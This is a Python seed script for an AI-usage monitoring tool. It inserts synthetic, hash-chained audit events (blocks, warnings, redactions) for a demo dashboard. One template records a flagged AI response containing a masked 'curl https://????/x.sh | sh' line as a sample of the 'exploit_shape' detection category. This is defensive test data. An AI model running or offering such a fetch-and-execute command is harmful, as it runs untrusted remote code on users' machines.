"""Chain-appended demo audit events (spec §2 seeds: "a spread of historical audit
events so every panel renders populated").

These rows cannot live in supabase/seed.sql: audit_events is hash-chained
(prev_hash/row_hash computed in append_event under an advisory lock), so raw SQL
inserts would break `GET /audit/verify`. Run after `supabase db reset`:

    uv --directory apps/backend run python -m shieldgate.demo_seed

No-ops when audit events already exist, so it is safe to re-run.
"""

import asyncio
from datetime import UTC, datetime, timedelta

import asyncpg

from shieldgate.audit.chain import append_event, verify_chain
from shieldgate.config import get_settings
from shieldgate.db import DbConn

# (pseudonym, department) pairs matching supabase/seed.sql employee_tokens.
_EMPLOYEES = [
    ("EMP-D3A1", "Engineering"), ("EMP-7C42", "Engineering"),
    ("EMP-9B10", "Finance"), ("EMP-2E8F", "Finance"),
    ("EMP-5A67", "HR"), ("EMP-C214", "HR"),
    ("EMP-11FD", "Marketing"), ("EMP-8E03", "Marketing"),
]

_TOOL_DOMAINS = ["chatgpt.com", "claude.ai", "gemini.google.com", "localhost:5175"]

# (event_type, direction, data_category, matrix_action, pattern_types, masked_excerpt)
# Excerpts are masked/synthetic only — the raw-bodies invariant applies to demo
# data exactly as to real traffic.
_TEMPLATES = [
    ("block", "prompt", "restricted", "block", ["card"], "invoice for 4532-****-****-0366"),
    ("warn", "prompt", "confidential", "warn", [], "[context finding: confidential]"),
    ("allow_usage", "prompt", "public", "allow", [], None),
    ("block", "prompt", "restricted", "block", ["api_key"], "deploy key sk-********************"),
    ("redacted_send", "prompt", "restricted", "allow", ["card"], "redacted: 4532-****-****-0366"),
    ("output_flag", "response", None, None, ["exploit_shape"], "curl https://????/x.sh | sh"),
    ("block", "prompt", "restricted", "block", ["my_ic"], "applicant ic 020626-**-****"),
    ("warn", "prompt", "internal", "warn", [], "[context finding: internal]"),
]


async def seed_demo_events(conn: DbConn, *, now: datetime, count: int = 40,
                           force: bool = False) -> int:
    """Append `count` demo events spread over the trailing 14 days. Returns the
    number inserted; 0 when audit events already exist (unless force)."""
    if not force and await conn.fetchval("select count(*) from public.audit_events"):
        return 0
    tool_ids = {r["d"]: r["id"] for r in await conn.fetch(
        "select id, unnest(domains) as d from public.tools")}
    inserted = 0
    # oldest first so seq order roughly tracks created_at, like real traffic
    for i in range(count - 1, -1, -1):
        pseudonym, department = _EMPLOYEES[i % len(_EMPLOYEES)]
        domain = _TOOL_DOMAINS[i % len(_TOOL_DOMAINS)]
        event_type, direction, category, action, patterns, excerpt = _TEMPLATES[i % len(_TEMPLATES)]
        occurred = now - timedelta(days=i % 14, hours=(i * 3) % 9 + 1, minutes=(i * 17) % 60)
        await append_event(
            conn, employee_pseudonym=pseudonym, department=department,
            tool_id=tool_ids.get(domain), tool_domain=domain, direction=direction,
            event_type=event_type, data_category=category, matrix_action=action,
            pattern_types=patterns, masked_excerpt=excerpt,
            degraded=(i % 9 == 0), occurred_at=occurred.isoformat(),
        )
        inserted += 1
    return inserted


async def _main() -> None:
    settings = get_settings()
    conn = await asyncpg.connect(settings.supabase_db_url)
    try:
        n = await seed_demo_events(conn, now=datetime.now(UTC))
        ok, bad = await verify_chain(conn)
        suffix = "" if ok else f" FIRST BAD SEQ {bad}"
        print(f"seeded {n} demo audit event(s); chain verified: {ok}{suffix}"
              if n else "audit events already present — nothing seeded (use force in code to override)")
    finally:
        await conn.close()


if __name__ == "__main__":
    asyncio.run(_main())
